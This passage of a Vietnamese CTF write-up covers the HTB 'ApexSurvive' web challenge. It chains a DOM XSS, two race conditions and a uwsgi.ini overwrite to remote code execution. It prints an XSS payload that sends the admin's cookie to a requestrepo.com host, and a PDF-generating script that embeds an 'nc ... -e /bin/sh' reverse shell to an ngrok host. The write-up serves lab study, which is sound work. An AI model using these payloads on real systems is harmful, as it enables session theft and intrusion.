</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=n>let</span> <span class=n>note</span> <span class=o>=</span> <span class=err>`</span><span class=p>{{</span> <span class=n>product</span><span class=o>.</span><span class=n>note</span> <span class=o>|</span> <span class=n>safe</span> <span class=p>}}</span><span class=err>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>clean</span> <span class=o>=</span> <span class=n>DOMPurify</span><span class=o>.</span><span class=n>sanitize</span><span class=p>(</span><span class=n>note</span><span class=p>,</span> <span class=p>{</span><span class=n>FORBID_ATTR</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;style&#39;</span><span class=p>],</span> <span class=n>USE_PROFILES</span><span class=p>:</span> <span class=p>{</span><span class=n>html</span><span class=p>:</span><span class=bp>true</span><span class=p>}});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>document</span><span class=o>.</span><span class=n>getElementById</span><span class=p>(</span><span class=s1>&#39;note&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>innerHTML</span> <span class=o>+=</span> <span class=n>clean</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>script</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Note là một thuộc tính mà mình control khi addProduct -> sử dụng backtick escape khỏi đoạn khai báo note -> XSS:
<img src=https://hackmd.io/_uploads/BJfcIS7Ca.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/rJKGwHQRa.png loading=lazy alt=image><br>Kết hợp với việc có thể report cho admin về các product, mình có payload sau để lấy session của admin:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>`;fetch(&#34;https://9vja3pan.requestrepo.com/?&#34;+document.cookie);//
</span></span></code></pre></td></tr></table></div></div><h3 id=bypass-isinternal-with-race-condition>Bypass isInternal with race condition</h3><p>Tiếp tục vùi đầu vào đống source code, mình thấy được ở đoạn verifyEmail, email được tách ra thành tên và hostname, kiểu <code>a@gmail.com</code> thì tên là <code>a</code> và hostname là <code>gmail.com</code>. Nếu như hostname của mình là <code>apexsurvive.htb</code> thì database sẽ set <strong>isInternal=&ldquo;true&rdquo;</strong>, đây chính là chỗ mình cần phải exploit</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def verifyEmail(token):
</span></span><span class=line><span class=cl>    user = query(&#39;SELECT * from users WHERE confirmToken = %s&#39;, (token, ), one=True)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if user and user[&#39;isConfirmed&#39;] == &#39;unverified&#39;:
</span></span><span class=line><span class=cl>        _, hostname = parseaddr(user[&#39;unconfirmedEmail&#39;])[1].split(&#39;@&#39;, 1)
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        if hostname == &#39;apexsurvive.htb&#39;:
</span></span><span class=line><span class=cl>            query(&#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=&#34;&#34;, confirmToken=&#34;&#34;, isInternal=&#34;true&#34; WHERE id=%s&#39;, (&#39;verified&#39;, user[&#39;unconfirmedEmail&#39;], user[&#39;id&#39;],))
</span></span><span class=line><span class=cl>        else:
</span></span><span class=line><span class=cl>            query(&#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=&#34;&#34;, confirmToken=&#34;&#34; WHERE id=%s&#39;, (&#39;verified&#39;, user[&#39;unconfirmedEmail&#39;], user[&#39;id&#39;],))
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        mysql.connection.commit()
</span></span><span class=line><span class=cl>        return True
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    return False
</span></span></code></pre></td></tr></table></div></div><p>Ngặt nghèo ở chỗ là trang email của chúng ta chỉ nhận email gửi đến <code>test@email.htb</code> :cry:. Sau khi bế&rsquo;s tắc một khoảng thời gian khá lâu thì teammate <a class=link href=https://hackmd.io/@chuongcd target=_blank rel=noopener>Chương</a> tìm ra được cách để nhận được email của tài khoản có hostname <code>apexsurvive.htb</code> là <strong>race condition</strong>:</p><ul><li>Khi chỉnh sửa profile từ một email đã verify thành một email khác, server sẽ tự gửi token đến email đó</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@api.route(&#39;/profile&#39;, methods=[&#39;POST&#39;])
</span></span><span class=line><span class=cl>    ...
</span></span><span class=line><span class=cl>    if result:
</span></span><span class=line><span class=cl>        if result == &#39;email changed&#39;:
</span></span><span class=line><span class=cl>            sendEmail(decodedToken.get(&#39;id&#39;), email)
</span></span><span class=line><span class=cl>        return response(&#39;Profile updated!&#39;)
</span></span></code></pre></td></tr></table></div></div><ul><li>API sendVerification cho biết server sẽ lấy thông tin của user đó, kiểm tra xem user đã được confirm email chưa, nếu chưa sẽ gửi token đến email đó</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@api.route(&#39;/sendVerification&#39;, methods=[&#39;GET&#39;])
</span></span><span class=line><span class=cl>@isAuthenticated
</span></span><span class=line><span class=cl>@sanitizeInput
</span></span><span class=line><span class=cl>def sendVerification(decodedToken):
</span></span><span class=line><span class=cl>    user = getUser(decodedToken.get(&#39;id&#39;))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if user[&#39;isConfirmed&#39;] == &#39;unverified&#39;:
</span></span><span class=line><span class=cl>        if checkEmail(user[&#39;unconfirmedEmail&#39;]):
</span></span><span class=line><span class=cl>            sendEmail(decodedToken.get(&#39;id&#39;), user[&#39;unconfirmedEmail&#39;])
</span></span><span class=line><span class=cl>            return response(&#39;Verification link sent!&#39;)
</span></span><span class=line><span class=cl>        else:
</span></span><span class=line><span class=cl>            return response(&#39;Invalid Email&#39;)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    return response(&#39;User already verified!&#39;)
</span></span></code></pre></td></tr></table></div></div><p>-> Có thể race condition save profile 2 email, đồng thời sendVerification để yêu cầu gửi token đến email, từ đó ghi đè nội dung server gửi cho <code>test@email.htb</code> thành của <code>test@apexsurvive.htb</code>, từ đó lấy token của email <code>test@apexsurvive.htb</code> đi verify là được <strong>isInternal=true</strong>.</p><h3 id=complete-the-attack-chain--exploit>Complete the attack chain & Exploit</h3><p>Các bước tấn công đã đầy đủ, nên mình sẽ tổng hợp lại như sau:</p><ul><li>Race condition verify email -> bypass isInternal</li><li>Dom Based XSS tại /addProduct -> lấy session admin/ bypass admin</li><li>Race condition upload file -> RCE</li></ul><p>Attack chain có tận 2 lần race condition nên việc có thể solve nhanh hay chậm nó phụ thuộc vào may mắn khá nhiều =)), sau khi rõ hướng thì mình deploy web rồi làm luôn và theo như mình thấy thì race verify email là công đoạn lâu nhất.</p><ul><li>Bypass isInternal
Mình tiếp tục sử dụng Burp Repeater để race condition email, với 3 req sendVerification, 1 req update profile <a class=link href=mailto:test@email.htb>test@email.htb</a> và 1 req <a class=link href=mailto:test@apexsurvive.htb>test@apexsurvive.htb</a>:
<img src=https://hackmd.io/_uploads/HJaQ_L7R6.png loading=lazy alt=image><br>Cuối cùng cũng có token có thể verify :cry:
<img src=https://hackmd.io/_uploads/rJd7c8QAa.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/r1L4qLQAa.png loading=lazy alt=image><br></li><li>Bypass admin
Sử dụng payload bên trên và report product id, mình có admin token:
<img src=https://hackmd.io/_uploads/SJeAcLXCT.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/SJSTiUXCT.png loading=lazy alt=image><br>Đến giờ truy cập admin để RCE rồi
<img src=https://hackmd.io/_uploads/HJJE3LX06.png loading=lazy alt=image><br></li><li>Upload file
Mình làm y hệt như ở trên local và lụm được flag của challenge:
<img src=https://hackmd.io/_uploads/rJ27AU7CT.png loading=lazy alt=image><br></li><li>Flag: <strong>HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}</strong></li></ul><p>P/s: Sau khi làm xong mình mới thấy là nếu như render ra pdf thì trang web sẽ bị lỗi và không lưu lại template đó nên mình có thể tiếp tục race mà không phải redeploy challenge.</p><h3 id=another-workaround-to-bypass-pdf-upload>Another workaround to bypass PDF upload</h3><p>Sau khi đi tản mạn write up của mọi người, mình có tìm được bài write up này có một solution khác để trigger RCE thông qua upload file: <a class=link href=https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/ target=_blank rel=noopener>https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/</a>
Đây là một cách rất hay khi server <code>uwsgi</code> dính lỗi arbitary PDF upload, cụ thể là nhằm vào file <code>uwgsi.ini</code> (Chi tiết ở document): <a class=link href=https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html target=_blank rel=noopener>https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html</a></p><ul><li><code>uwsgi</code> có khả năng đọc file config của chính nó kể cả khi file dưới dạng binary, miễn sao nó tìm được chuỗi bắt đầu khai báo config hợp lệ: <code>[uwsgi]</code></li><li><code>uwsgi</code> sử dụng operator <code>@</code> và các scheme để hỗ trợ include, đọc file và call các function, trong đó có scheme <code>exec</code> dùng để thực thi câu lệnh -> Thứ mình cần dùng:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    [uwsgi]
</span></span><span class=line><span class=cl>    ; read from a process stdout
</span></span><span class=line><span class=cl>    body = @(exec://whoami)
</span></span></code></pre></td></tr></table></div></div><p>Việc tấn công vào file ini sẽ cần một yếu tố quan trọng khác: Làm thế nào để <code>uwsgi</code> reload lại config của chính nó?
Điều này có thể được giải quyết nếu như <code>uwsgi</code> config sẵn chức năng dùng để debug <code>py-auto-reload</code>, nếu như phát hiện sự thay đổi của các file trong server thì config sẽ được reload.
Việc upload file PDF là chưa đủ, nên sau đó mình cần phải ghi đè một file <code>.py</code> thì server mới reload lại config, từ đó trigger RCE.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>    <span class=n>py</span><span class=o>-</span><span class=n>autoreload</span> <span class=o>=</span> <span class=mi>3</span>
</span></span></code></pre></td></tr></table></div></div><p>Document cũng có luôn cả POC nên mình sẽ sửa để đổi thành payload reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>fpdf</span> <span class=n>import</span> <span class=n>FPDF</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>exiftool</span> <span class=n>import</span> <span class=n>ExifToolHelper</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>with</span> <span class=n>ExifToolHelper</span><span class=p>()</span> <span class=n>as</span> <span class=n>et</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>et</span><span class=o>.</span><span class=n>set_tags</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=s2>&#34;lmao.jpg&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>tags</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;model&#34;</span><span class=p>:</span> <span class=s2>&#34;&amp;#x0a;[uwsgi]&amp;#x0a;foo = @(exec://nc 0.tcp.ap.ngrok.io 18726 -e /bin/sh)&amp;#x0a;&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=n>params</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;-E&#34;</span><span class=p>,</span> <span class=s2>&#34;-overwrite_original&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>MyFPDF</span><span class=p>(</span><span class=n>FPDF</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pdf</span> <span class=o>=</span> <span class=n>MyFPDF</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pdf</span><span class=o>.</span><span class=n>add_page</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pdf</span><span class=o>.</span><span class=n>image</span><span class=p>(</span><span class=s1>&#39;./lmao.jpg&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pdf</span><span class=o>.</span><span class=n>output</span><span class=p>(</span><span class=s1>&#39;exploit.pdf&#39;</span><span class=p>,</span> <span class=s1>&#39;F&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Lưu ý: Nếu báo lỗi không có module exiftool thì mình sẽ chạy câu lệnh</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>    <span class=n>python3</span> <span class=o>-</span><span class=n>m</span> <span class=n>pip</span> <span class=n>install</span> <span class=o>-</span><span class=n>U</span> <span class=n>pyexiftool</span>
</span></span></code></pre></td></tr></table></div></div><p>Sau khi gen ra PDF thì mình gửi đi để ghi đè <code>/app/uwsgi.ini</code>
<img src=https://hackmd.io/_uploads/ByNAHNrR6.png loading=lazy alt=image><br>Ghi đè tiếp <code>/app/application/database.py</code> để trigger <code>uwgsi</code> reload lại config
<img src=https://hackmd.io/_uploads/BJ0GU4BAT.png loading=lazy alt=image><br>Log server thông báo việc file <code>database.py</code> đã bị thay đổi, tiến hành kill tiến trình và khởi động lại /app, load lại config
<img src=https://hackmd.io/_uploads/HJ4zLESRp.png loading=lazy alt=image><br>Reverse Shell thành công<br><img src=https://hackmd.io/_uploads/SyS4L4H0p.png loading=lazy alt=image><br></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>